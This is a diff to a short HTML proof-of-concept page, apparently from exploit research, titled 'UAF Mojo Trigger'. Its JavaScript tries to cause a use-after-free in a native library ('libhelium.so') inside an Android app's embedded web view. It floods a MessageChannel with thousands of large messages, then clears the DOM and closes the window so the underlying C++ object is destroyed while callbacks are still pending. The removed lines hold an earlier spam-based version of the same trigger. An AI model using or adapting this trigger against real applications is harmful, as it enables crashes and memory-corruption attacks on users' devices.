@@ -1,22 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><title>UAF Race Trigger</title></head>
+<head><title>UAF Mojo Trigger</title></head>
 <body>
 <script>
-    // Rapidly trigger internal IPC messages to libhelium
-    function spamMojo() {
-        for(let i = 0; i < 50; i++) {
-            // Force the WebContents to query its layout/cache
-            window.scrollTo(0, Math.random() * 100);
-            document.cookie = "fuzz" + i + "=test; max-age=1";
-            history.pushState({}, "", "/#fuzz" + i);
+    function triggerUAF() {
+        // 1. Create a communication channel
+        const channel = new MessageChannel();
+        
+        // 2. Choke the IPC pipeline to libhelium.so
+        // We send thousands of messages instantly to fill the queue
+        for (let i = 0; i < 15000; i++) {
+            channel.port1.postMessage("A".repeat(1024));
         }
-        // Attempt to trigger the destruction callback from the inside
-        setTimeout(() => { window.close(); }, 50);
+
+        // 3. Trigger immediate inner destruction
+        // By removing the body while the IPC queue is full, we force 
+        // the C++ WebContents to destruct while callbacks are pending.
+        setTimeout(() => {
+            document.documentElement.innerHTML = "";
+            window.close(); // Ask the Android Activity to finish()
+        }, 10);
     }
 
-    // Run immediately
-    spamMojo();
+    // Delay slightly to ensure Faceweb has loaded the DOM
+    setTimeout(triggerUAF, 500); 
 </script>
 </body>
 </html>
